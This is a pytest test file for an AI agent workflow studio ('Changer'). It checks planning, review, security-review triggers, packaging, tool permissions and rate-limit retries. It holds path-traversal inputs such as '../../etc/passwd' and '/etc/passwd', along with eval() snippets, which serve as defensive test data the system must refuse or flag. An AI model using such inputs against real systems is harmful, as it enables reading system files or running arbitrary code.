@pytest.mark.asyncio
async def test_a_quick_change_runs_to_a_zip(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan()))
    wire(studio, tmp_path)
    await studio.changer_start("Make the Lab say bubbles")
    project = await settle(studio)
    assert project.status == "awaiting_release", project.note
    assert project.budget < 2_000_000  # a quick change gets the small budget
    kinds = [t["kind"] for t in project.tasks]
    assert kinds == ["plan", "build", "review"]
    made = await studio.changer_package("")
    assert made["version"] == "6.75.1"
    project = await studio._store.require(ChangeProject, project.id)
    assert project.status == "done" and project.release["name"] == made["name"]


@pytest.mark.asyncio
async def test_a_project_waits_for_approval_then_builds_each_milestone(
    make_studio, tmp_path
):
    plan = {
        **quick_plan(),
        "size": "project",
        "milestones": [
            {"title": "Bubbles", "goal": "Lab returns bubbles", "files": [LAB]},
            {"title": "Tidy", "goal": "tidy up"},
        ],
    }
    studio, _ = make_studio(team(plan, verdicts=["pass", "pass"]))
    wire(studio, tmp_path)
    await studio.changer_start("Big one")
    project = await settle(studio)
    assert project.status == "awaiting_plan" and "Approve" in project.note
    await studio.changer_act("approve")
    project = await settle(studio)
    assert project.status == "awaiting_release", project.note
    assert project.milestone == 2
    statuses = [m["status"] for m in milestones_of(project.plan)]
    assert statuses == ["done", "done"]
    ids = [str(c["id"]) for c in project.checkpoints]
    assert len(ids) == 4 and len(set(ids)) == 4
    made = await studio.changer_package("")
    assert made["version"] == "6.76.0"  # an update project bumps the minor


@pytest.mark.asyncio
async def test_a_protected_quick_change_waits_and_says_why(make_studio, tmp_path):
    trading = "src/free_claude_code/studio/trading/desk.py"
    studio, _ = make_studio(team(quick_plan(files=[trading])))
    wire(studio, tmp_path)
    await studio.changer_start("Change the desk")
    project = await settle(studio)
    assert project.status == "awaiting_plan" and trading in project.note


@pytest.mark.asyncio
async def test_a_vague_request_offers_suggestions(make_studio, tmp_path):
    suggestions: JsonObject = {
        "action": "plan",
        "suggestions": [{"title": "Dark mode", "why": "eyes"}, {"title": "Search"}],
    }
    studio, _ = make_studio(team(suggestions))
    wire(studio, tmp_path)
    await studio.changer_start("Make it better")
    project = await settle(studio)
    assert project.status == "choose"
    view = await studio.changer_view()
    shown = view["project"]
    assert isinstance(shown, dict) and len(shown["plan"]["suggestions"]) == 2
    assert [t["kind"] for t in project.tasks] == ["plan"]  # nothing built


@pytest.mark.asyncio
async def test_a_planner_without_a_plan_fails_the_project(make_studio, tmp_path):
    studio, _ = make_studio(team({"action": "plan", "milestones": []}))
    wire(studio, tmp_path)
    await studio.changer_start("x")
    project = await settle(studio)
    assert project.status == "failed" and "without a plan" in project.note


@pytest.mark.asyncio
async def test_a_plan_with_a_bad_path_isnt_used(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan(files=["../../etc/passwd"])))
    wire(studio, tmp_path)
    await studio.changer_start("x")
    project = await settle(studio)
    assert project.status == "failed"
    assert [t["kind"] for t in project.tasks] == ["plan", "plan"]  # one hand-in ask


@pytest.mark.asyncio
async def test_a_failing_review_gets_fixed(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan(), verdicts=["fail", "pass"]))
    wire(studio, tmp_path)
    await studio.changer_start("Make the Lab say bubbles")
    project = await settle(studio)
    assert project.status == "awaiting_release", project.note
    assert [t["kind"] for t in project.tasks] == [
        "plan",
        "build",
        "review",
        "fix",
        "review",
    ]


@pytest.mark.asyncio
async def test_too_many_failed_reviews_stop_for_the_owner(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan(), verdicts=["fail", "fail", "fail"]))
    wire(studio, tmp_path)
    await studio.changer_start("Make the Lab say bubbles")
    project = await settle(studio)
    assert project.status == "paused" and "still has problems" in project.note
    first = milestones_of(project.plan)[0]
    assert first["status"] == "needs you"
    assert "returns fizz" in str(first["review"])


@pytest.mark.asyncio
async def test_a_broken_model_pauses_before_any_work(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan(), ping_fails=True))
    wire(studio, tmp_path)
    await studio.changer_start("x")
    project = await settle(studio)
    assert project.status == "paused" and "didn't answer" in project.note
    assert project.tasks == []


@pytest.mark.asyncio
async def test_a_tiny_budget_pauses_before_building(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan()))
    wire(studio, tmp_path)
    await studio.changer_start("x", budget=1)
    project = await settle(studio)
    assert project.status == "paused" and "Ran out of budget" in project.note
    assert [t["kind"] for t in project.tasks] == ["plan"]


@pytest.mark.asyncio
async def test_risky_code_brings_in_the_security_reviewer(make_studio, tmp_path):
    studio, _ = make_studio(
        team(
            quick_plan(),
            verdicts=["pass", "pass"],
            new_text="eval('1')",
        )
    )
    wire(studio, tmp_path)
    await studio.changer_start("x")
    project = await settle(studio)
    kinds = [t["kind"] for t in project.tasks]
    assert "security" in kinds, kinds


@pytest.mark.asyncio
async def test_a_plain_change_has_no_security_review(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan()))
    wire(studio, tmp_path)
    await studio.changer_start("x")
    project = await settle(studio)
    assert "security" not in [t["kind"] for t in project.tasks]


@pytest.mark.asyncio
async def test_the_team_shows_on_the_page(make_studio, tmp_path):
    studio, _ = make_studio(team(quick_plan()))
    wire(studio, tmp_path)
    await studio.changer_start("x")
    await settle(studio)
    view = await studio.changer_view()
    shown = view["project"]
    assert isinstance(shown, dict)
    assert {"Changer", "Changer Planner", "Changer Reviewer"} <= set(shown["team"])
    assert int(shown["tokens"]) > 0
    assert all(t["status"] == "succeeded" for t in shown["tasks"])


# ------------------------------------------------------------ packing


@pytest.mark.asyncio
async def test_packing_waits_while_the_changer_works(
    make_studio, tmp_path, monkeypatch
):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    keep_driving(studio, monkeypatch)
    await studio.changer_fresh_copy()
    target = await studio._changer_target()
    (target / LAB).write_text("eval(x)\n")
    await studio._store.put(ChangeProject(request="x", status="building"))
    with pytest.raises(StudioError, match="still working"):
        await studio.changer_package("")


@pytest.mark.asyncio
async def test_a_confirmed_risky_zip_lists_the_hits(make_studio, tmp_path):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    await studio.changer_fresh_copy()
    target = await studio._changer_target()
    (target / LAB).write_text("eval(x)\n")
    blocked = await studio.changer_package("")
    assert blocked["blocked"] is True
    made = await studio.changer_package("", confirm=True)
    with zipfile.ZipFile(studio._changer.updates_dir / str(made["name"])) as archive:
        report = archive.read(f"fcc/_update/{made['version']}/TEST-REPORT.md").decode()
    assert "confirmed by you" in report and "eval/exec" in report


@pytest.mark.asyncio
async def test_a_paused_project_can_still_be_packed_without_finishing(
    make_studio, tmp_path
):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    await studio.changer_fresh_copy()
    target = await studio._changer_target()
    (target / LAB).write_text("def mix():\n    return 'b'\n")
    project = ChangeProject(request="x", status="paused")
    await studio._store.put(project)
    await studio.changer_package("")
    after = await studio._store.require(ChangeProject, project.id)
    assert after.status == "paused"


# ------------------------------------------------------------ the tool


def call(arguments: JsonObject) -> ToolCall:
    return ToolCall(id="c1", name="fcc_changer", arguments=arguments)


async def tool_studio(make_studio, tmp_path, tasks: list[JsonObject]):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    copy = await studio.changer_fresh_copy()
    await studio._store.put(ChangeProject(request="x", status="building", tasks=tasks))
    return studio, copy


@pytest.mark.asyncio
async def test_the_tool_is_refused_outside_the_copy(make_studio, tmp_path):
    studio, _ = await tool_studio(make_studio, tmp_path, [])
    outcome = await studio._changer_tool(
        call({"action": "changes"}),
        ToolContext(agent_id="a", chat_id="c", site_id="other"),
    )
    assert outcome.failed and "only in the Changer copy" in outcome.text


@pytest.mark.asyncio
@pytest.mark.parametrize("action", ["", "explode", "PLAN ", "package"])
async def test_unknown_and_refused_tool_actions(make_studio, tmp_path, action):
    studio, copy = await tool_studio(make_studio, tmp_path, [])
    outcome = await studio._changer_tool(
        call({"action": action}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("kind", "action", "ok"),
    [
        ("plan", "plan", True),
        ("build", "plan", False),
        ("review", "plan", False),
        ("review", "review", True),
        ("security", "review", True),
        ("build", "review", False),
        ("fix", "review", False),
        ("helper", "review", False),
        ("plan", "review", False),
    ],
)
async def test_only_the_right_step_submits(make_studio, tmp_path, kind, action, ok):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": kind}]
    )
    arguments: JsonObject = (
        {**quick_plan(), "action": "plan"}
        if action == "plan"
        else {"action": "review", "verdict": "pass"}
    )
    outcome = await studio._changer_tool(
        call(arguments), ToolContext(agent_id="a", chat_id="c", site_id=copy.id)
    )
    assert outcome.failed is not ok, outcome.text


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("verdict", "ok"),
    [("pass", True), ("fail", True), ("PASS", True), ("maybe", False), ("", False)],
)
async def test_verdicts_are_pass_or_fail(make_studio, tmp_path, verdict, ok):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": "review"}]
    )
    outcome = await studio._changer_tool(
        call({"action": "review", "verdict": verdict, "findings": "not a list"}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed is not ok
    if ok:
        project = await studio._change_project()
        assert project is not None
        review = project.tasks[0]["review"]
        assert isinstance(review, dict) and review["findings"] == []


@pytest.mark.asyncio
async def test_the_tool_lists_changes(make_studio, tmp_path):
    studio, copy = await tool_studio(make_studio, tmp_path, [])
    target = await studio._changer_target()
    (target / LAB).write_text("x = 1\n")
    outcome = await studio._changer_tool(
        call({"action": "changes"}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert not outcome.failed and f"Changed: {LAB}" in outcome.text


@pytest.mark.asyncio
async def test_a_helper_needs_a_task(make_studio, tmp_path):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": "build"}]
    )
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "  "}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed and "task" in outcome.text


@pytest.mark.asyncio
@pytest.mark.parametrize("kind", ["helper", "plan", "review", "security"])
async def test_only_the_builder_starts_helpers(make_studio, tmp_path, kind):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": kind}]
    )
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "do part"}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed and "Only the builder" in outcome.text


async def running_helpers(studio, files: list[list[str]]) -> list[JsonObject]:
    tasks: list[JsonObject] = [{"run_id": "rb", "chat_id": "c", "kind": "build"}]
    for number, owned in enumerate(files):
        run = AgentRun(
            agent_id="a", chat_id=f"h{number}", goal="Helper", status="running"
        )
        await studio._store.put(run)
        tasks.append(
            {
                "run_id": run.id,
                "chat_id": f"h{number}",
                "kind": "helper",
                "files": list(owned),
            }
        )
    return tasks


@pytest.mark.asyncio
async def test_at_most_two_helpers_at_once(make_studio, tmp_path):
    studio, copy = await tool_studio(make_studio, tmp_path, [])
    tasks = await running_helpers(studio, [["a.py"], ["b.py"]])
    project = await studio._change_project()
    assert project is not None
    await studio._save_project(project, tasks=tasks)
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "more", "files": ["c.py"]}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed and "already working" in outcome.text


@pytest.mark.asyncio
async def test_helpers_never_share_a_file(make_studio, tmp_path):
    studio, copy = await tool_studio(make_studio, tmp_path, [])
    tasks = await running_helpers(studio, [["a.py", "b.py"]])
    project = await studio._change_project()
    assert project is not None
    await studio._save_project(project, tasks=tasks)
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "more", "files": ["b.py"]}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed and "owns b.py" in outcome.text


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "name", ["Nobody", "Changer Reviewer", "Changer Security", "Changer Planner"]
)
async def test_helpers_cant_be_strangers_or_the_checkers(make_studio, tmp_path, name):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": "build"}]
    )
    await studio._changer_reviewer(security=False)
    await studio._changer_reviewer(security=True)
    await studio._changer_planner()
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "do part", "agent": name}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed, outcome.text


@pytest.mark.asyncio
async def test_the_reviewer_is_never_the_builder(make_studio, tmp_path):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    builder = await studio._changer_agent()
    for security in (False, True):
        reviewer = await studio._changer_reviewer(security=security)
        assert reviewer.id != builder.id
    planner = await studio._changer_planner()
    assert "write_file" not in planner.tools and "edit_file" not in planner.tools
    assert "write_file" not in reviewer.tools and "edit_file" not in reviewer.tools


# ------------------------------------------------------------ through the app


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("path", "body", "code"),
    [
        ("/studio/api/changer/project/explode", {}, 422),
        ("/studio/api/changer/project/pause", {}, 400),
        ("/studio/api/changer/start", {"request": "x", "budget": -1}, 422),
        ("/studio/api/changer/start", {"request": "x", "budget": 10**12}, 422),
        ("/studio/api/changer/start", {"request": ""}, 422),
        ("/studio/api/changer/project/choose", {"index": "zero"}, 422),
        ("/studio/api/changer/project/rollback", {"checkpoint": "x" * 99}, 422),
    ],
)
async def test_the_app_checks_what_it_is_sent(make_studio, tmp_path, path, body, code):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    app = create_test_app(studio=studio)
    async with httpx.AsyncClient(
        transport=httpx.ASGITransport(app=app), base_url="http://127.0.0.1"
    ) as client:
        response = await client.post(path, json=body)
    assert response.status_code == code, response.text


def test_the_fake_app_matches_the_test_versions():
    assert '"6.75.0"' in PYPROJECT and make_app is not None


@pytest.mark.asyncio
@pytest.mark.parametrize("files", [["."], ["../x.py"], ["/etc/passwd"], ["src/"]])
async def test_helper_files_follow_the_plan_path_rules(make_studio, tmp_path, files):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": "build"}]
    )
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "do part", "files": files}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert outcome.failed and "isn't a file path" in outcome.text


@pytest.mark.asyncio
async def test_resuming_a_choice_shows_the_hint(make_studio, tmp_path, monkeypatch):
    studio, _ = make_studio([])
    wire(studio, tmp_path)
    keep_driving(studio, monkeypatch)
    project = ChangeProject(
        request="x", status="paused", plan={"suggestions": [{"title": "Dark mode"}]}
    )
    await studio._store.put(project)
    await studio.changer_act("resume")
    after = await studio._store.require(ChangeProject, project.id)
    assert after.status == "choose" and "Pick one" in after.note


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("files", "refused"), [(None, False), ("src/a.py", False), ("../a.py", True)]
)
async def test_helper_files_given_oddly(make_studio, tmp_path, files, refused):
    studio, copy = await tool_studio(
        make_studio, tmp_path, [{"run_id": "r", "chat_id": "c", "kind": "build"}]
    )
    outcome = await studio._changer_tool(
        call({"action": "subagent", "task": "do part", "files": files}),
        ToolContext(agent_id="a", chat_id="c", site_id=copy.id),
    )
    assert ("isn't a file path" in outcome.text) is refused
    if not refused:
        project = await studio._change_project()
        assert project is not None
        helper = project.tasks[-1]
        assert helper["kind"] == "helper"
        assert helper["files"] == ([] if files is None else [files])


# ------------------------------------------------------------ provider limits


@pytest.mark.parametrize(
    ("text", "limited"),
    [
        ("Model endpoint returned 429: rate_limit_error", False),
        ("You exceeded your current quota", True),
        ("RESOURCE_EXHAUSTED", True),
        ("429 quota exceeded: GenerateRequestsPerMinutePerProjectPerModel", False),
        ("Provider rate limit reached", False),
        ("GenerateRequestsPerDayPerProjectPerModel-FreeTier", True),
        ("Connection refused", False),
        ("no such model", False),
        ("", False),
    ],
)
def test_limit_notes(text, limited):
    from free_claude_code.studio.changer_projects import limit_note

    note = limit_note(text, "gemini/x")
    assert bool(note) is limited
    if limited:
        assert "gemini/x" in note and "Resume" in note and "{" not in note


def limited_team(*, at_ping: bool):
    def respond(system: str, prompt: str) -> object:
        if prompt == "Reply with the word OK." and at_ping:
            raise RuntimeError('Model endpoint returned 429: {"error": "quota"}')
        if prompt == "Reply with the word OK.":
            from free_claude_code.studio.llm import LLMReply

            return LLMReply(text="OK")
        raise RuntimeError('Model endpoint returned 429: {"error": "quota"}')

    return respond


@pytest.mark.asyncio
@pytest.mark.parametrize("at_ping", [True, False])
async def test_a_used_up_limit_pauses_with_a_plain_note(make_studio, tmp_path, at_ping):
    studio, _ = make_studio(limited_team(at_ping=at_ping))
    wire(studio, tmp_path)
    await studio.changer_start("Make the Lab say bubbles")
    project = await settle(studio)
    assert project.status == "paused", project.note
    assert "used up its provider's allowance" in project.note
    assert "{" not in project.note


# ------------------------------------------------------------ carrying on


@pytest.mark.parametrize(
    ("reason", "again"),
    [
        ("step_limit Stopped after 40 steps without finishing.", True),
        ("stuck", True),
        ("Request timed out", True),
        ("Model endpoint returned 429: rate_limit_error", True),
        ("Model endpoint returned 503: overloaded", True),
        ("This model is currently experiencing high demand", True),
        ("Connection reset by peer", True),
        ("You exceeded your current quota", False),
        ("GenerateRequestsPerDayPerProjectPerModel 429", False),
        ("The model refused", False),
        ("", False),
    ],
)
def test_which_stops_carry_on(reason, again):
    from free_claude_code.studio.agents import worth_another_go

    assert worth_another_go(reason) is again


def test_the_carry_on_goal_says_where_it_stopped():
    from free_claude_code.studio.agents import carry_on_goal

    goal = carry_on_goal("BUILD milestone 1", "step_limit", 1)
    assert goal.startswith("CARRY ON (try 2)") and "ran out of steps" in goal
    assert "already done" in goal and goal.endswith("BUILD milestone 1")


def flaky_planner(fails: int, error: str) -> tuple[object, dict[str, int]]:
    """A Planner whose first calls fail with ``error``; then it plans."""
    from free_claude_code.studio.llm import StudioLLMError

    inner = team(quick_plan())
    seen = {"fails": fails, "failed": 0}

    def respond(system: str, prompt: str) -> object:
        if "Changer's Planner" in system and seen["fails"] > 0:
            seen["fails"] -= 1
            seen["failed"] += 1
            raise StudioLLMError(error)
        return inner(system, prompt)

    return respond, seen


async def planner_run(studio):
    await studio.changer_start("Make the Lab say bubbles")
    return await settle(studio)


@pytest.mark.asyncio
async def test_a_task_that_stops_early_carries_on(make_studio, tmp_path):
    respond, seen = flaky_planner(1, "Request timed out")
    studio, _ = make_studio(respond)
    wire(studio, tmp_path)
    studio._carry_on_wait = 0
    project = await planner_run(studio)
    assert project.status == "awaiting_release", project.note
    assert seen["failed"] == 1
    planner_chat = project.tasks[0]["chat_id"]
    events = await studio._store.find(Message, where={"chat_id": planner_chat})
    assert any(m.data.get("kind") == "carry_on" for m in events)


@pytest.mark.asyncio
async def test_carrying_on_has_a_limit(make_studio, tmp_path):
    respond, seen = flaky_planner(9, "Request timed out")
    studio, _ = make_studio(respond)
    wire(studio, tmp_path)
    studio._carry_on_wait = 0
    project = await planner_run(studio)
    assert project.status == "failed"
    assert seen["failed"] == 3  # the first try and two more


@pytest.mark.asyncio
async def test_a_used_up_day_doesnt_hammer_the_provider(make_studio, tmp_path):
    respond, seen = flaky_planner(9, "429: You exceeded your current quota")
    studio, _ = make_studio(respond)
    wire(studio, tmp_path)
    studio._carry_on_wait = 0
    project = await planner_run(studio)
    assert project.status == "paused" and "allowance" in project.note
    assert seen["failed"] == 1


@pytest.mark.asyncio
async def test_every_agent_carries_on_not_just_the_changer(make_studio, tmp_path):
    from free_claude_code.studio.llm import LLMReply, StudioLLMError

    calls = {"n": 0}

    def respond(system: str, prompt: str) -> object:
        if prompt == "Reply with the word OK.":
            return LLMReply(text="OK")
        calls["n"] += 1
        if calls["n"] == 1:
            raise StudioLLMError("Model endpoint returned 503: overloaded")
        return LLMReply(text="All done.")

    studio, _ = make_studio(respond)
    studio._carry_on_wait = 0
    agent = await studio.create_agent(
        name="Researcher", role="agent", model="nvidia_nim/test-model"
    )
    run = await studio.start_task(agent_id=agent.id, goal="Find three facts")
    job = studio._run_jobs.get(run.id)
    if job is not None:
        await job
    finished = await studio._store.require(AgentRun, run.id)
    assert finished.status == "succeeded" and calls["n"] == 2


async def agent_task(studio, respond_tools: tuple[str, ...] = ()):
    agent = await studio.create_agent(
        name="Researcher",
        role="agent",
        model="nvidia_nim/test-model",
        tools=respond_tools,
        all_tools=False,
    )
    return await studio.start_task(agent_id=agent.id, goal="Find three facts")


async def finish(studio, run) -> AgentRun:
    job = studio._run_jobs.get(run.id)
    if job is not None:
        await job
    return await studio._store.require(AgentRun, run.id)


@pytest.mark.asyncio
async def test_any_agent_stops_at_a_used_up_day(make_studio):
    from free_claude_code.studio.llm import StudioLLMError

    calls = {"n": 0}

    def respond(system: str, prompt: str) -> object:
        calls["n"] += 1
        raise StudioLLMError("429: You exceeded your current quota")

    studio, _ = make_studio(respond)
    studio._carry_on_wait = 0
    finished = await finish(studio, await agent_task(studio))
    assert finished.status == "failed" and calls["n"] == 1


@pytest.mark.asyncio
async def test_steps_add_up_across_tries(make_studio):
    from .conftest import tool_reply

    def respond(system: str, prompt: str) -> object:
        return tool_reply("web_search", {"query": "facts"})

    studio, _ = make_studio(
        respond, STUDIO_AGENT_MAX_STEPS=2, STUDIO_BUILDER_MAX_STEPS=2
    )
    studio._carry_on_wait = 0
    run = await agent_task(studio, ("web_search",))
    finished = await finish(studio, run)
    assert finished.status == "failed" and finished.step == 6
    events = await studio._store.find(Message, where={"chat_id": run.chat_id})
    kinds = [m.data.get("kind") for m in events]
    assert kinds.count("carry_on") == 2 and kinds.count("step_limit") == 3


@pytest.mark.asyncio
async def test_a_stop_during_the_wait_ends_it(make_studio):
    from free_claude_code.studio.llm import StudioLLMError

    calls = {"n": 0}

    def respond(system: str, prompt: str) -> object:
        calls["n"] += 1
        raise StudioLLMError("Model endpoint returned 429: rate_limit_error")

    studio, _ = make_studio(respond)
    studio._carry_on_wait = 30
    run = await agent_task(studio)
    for _ in range(200):
        events = await studio._store.find(Message, where={"chat_id": run.chat_id})
        if any(m.data.get("kind") == "carry_on" for m in events):
            break
        await asyncio.sleep(0.02)
    await studio.stop_agent_work(run.agent_id)
    stopped = await studio._store.require(AgentRun, run.id)
    assert stopped.status == "cancelled" and calls["n"] == 1


@pytest.mark.asyncio
async def test_a_planner_that_handed_in_doesnt_plan_again(make_studio, tmp_path):
    from .conftest import tool_reply

    calls = {"n": 0}
    inner = team(quick_plan())

    def respond(system: str, prompt: str) -> object:
        if "Changer's Planner" in system and prompt != "Reply with the word OK.":
            calls["n"] += 1
            if calls["n"] == 1:
                return tool_reply("fcc_changer", quick_plan())
            return tool_reply(
                "search_files", {"query": "more"}, call_id=f"s{calls['n']}"
            )
        return inner(system, prompt)

    studio, _ = make_studio(
        respond, STUDIO_AGENT_MAX_STEPS=3, STUDIO_BUILDER_MAX_STEPS=3
    )
    wire(studio, tmp_path)
    studio._carry_on_wait = 0
    project = await planner_run(studio)
    assert calls["n"] == 3  # one try only: the plan was already in
    assert project.plan.get("milestones")


# ------------------------------------------------------------ real-model lessons


@pytest.mark.parametrize(
    ("text", "brief"),
    [
        ("Model endpoint returned 429: rate_limit_error", True),
        ("Too Many Requests", True),
        ("429: You exceeded your current quota", False),
        ("Connection refused", False),
        ("429 quota exceeded: GenerateRequestsPerMinutePerProjectPerModel", True),
        ("429 quota exceeded: GenerateRequestsPerDayPerProjectPerModel", False),
    ],
)
def test_brief_limits(text, brief):
    from free_claude_code.studio.limits import brief_limit

    assert brief_limit(text) is brief


@pytest.mark.asyncio
async def test_a_brief_rate_limit_waits_instead_of_pausing(make_studio, tmp_path):
    from free_claude_code.studio.llm import StudioLLMError

    inner = team(quick_plan())
    pings = {"n": 0}

    def respond(system: str, prompt: str) -> object:
        if prompt == "Reply with the word OK.":
            pings["n"] += 1
            if pings["n"] == 1:
                raise StudioLLMError("Model endpoint returned 429: rate_limit_error")
        return inner(system, prompt)

    studio, _ = make_studio(respond)
    wire(studio, tmp_path)
    studio._carry_on_wait = 0
    await studio.changer_start("Make the Lab say bubbles")
    project = await settle(studio)
    assert project.status == "awaiting_release", project.note


@pytest.mark.asyncio
@pytest.mark.parametrize("who", ["planner", "reviewer"])
async def test_findings_written_as_text_are_handed_in(make_studio, tmp_path, who):
    from free_claude_code.studio.llm import LLMReply

    inner = team(quick_plan())
    asked = {"n": 0}
    marker = "Changer's Planner" if who == "planner" else "Reviewer"

    def respond(system: str, prompt: str) -> object:
        if marker in system and prompt != "Reply with the word OK.":
            asked["n"] += 1
            if asked["n"] == 1:
                return LLMReply(text="I found it: lab.py returns fizz.")
        return inner(system, prompt)

    studio, _ = make_studio(respond)
    wire(studio, tmp_path)
    studio._carry_on_wait = 0
    await studio.changer_start("Make the Lab say bubbles")
    project = await settle(studio)
    assert project.status == "awaiting_release", project.note
    kinds = [t["kind"] for t in project.tasks]
    assert kinds.count("plan" if who == "planner" else "review") == 2


@pytest.mark.asyncio
async def test_an_empty_answer_carries_on(make_studio):
    from free_claude_code.studio.llm import LLMReply

    calls = {"n": 0}

    def respond(system: str, prompt: str) -> object:
        calls["n"] += 1
        return LLMReply(text="" if calls["n"] <= 2 else "All done.")

    studio, _ = make_studio(respond)
    studio._carry_on_wait = 0
    finished = await finish(studio, await agent_task(studio))
    assert finished.status == "succeeded" and calls["n"] == 3


LIMIT_TEXTS = [
    ("Quota exceeded: GenerateRequestsPerMinute ... quota", "minute"),
    (
        "GenerateRequestsPerMinutePerProjectPerModel exceeded, your current quota is 15",
        "minute",
    ),
    ("You exceeded your current quota\nlimit: GenerateRequestsPerMinute", "minute"),
    ("You exceeded your current quota, GenerateRequestsPerMinute", "minute"),
    ("429 Too Many Requests", "minute"),
    ("You exceeded your current quota", "day"),
    ("quota per day used", "day"),
    ("GenerateRequestsPerDay exceeded", "day"),
    ("RESOURCE_EXHAUSTED", "day"),
]


@pytest.mark.parametrize(("text", "kind"), LIMIT_TEXTS)
def test_every_part_of_fcc_reads_limits_the_same_way(text, kind):
    from free_claude_code.studio.agents import worth_another_go
    from free_claude_code.studio.changer_projects import limit_note
    from free_claude_code.studio.limits import brief_limit, daily_limit

    assert daily_limit(text) is (kind == "day")
    assert brief_limit(text) is (kind == "minute")
    assert bool(limit_note(text, "m")) is (kind == "day")
    assert worth_another_go(text) is (kind == "minute")
